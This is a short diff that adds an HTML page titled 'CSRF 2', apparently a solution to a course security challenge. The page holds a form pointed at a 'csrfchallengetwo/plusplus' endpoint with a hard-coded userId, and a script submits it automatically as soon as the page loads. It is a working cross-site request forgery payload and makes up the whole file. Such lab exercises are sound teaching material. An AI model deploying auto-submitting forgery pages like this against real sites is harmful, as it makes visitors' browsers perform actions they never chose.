@@ -1,1 +1,16 @@
-Hello World
+<!DOCTYPE html>
+<html>
+
+<body>
+    <h1>CSRF 2</h1>
+    <form name="csrfForm"
+        action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=2eff24c04dc96585b7fadc8b1fd6d80081c3ffdd"
+        method="POST">
+        <input type="submit" />
+    </form>
+    <script>
+        document.csrfForm.submit();
+    </script>
+</body>
+
+</html>
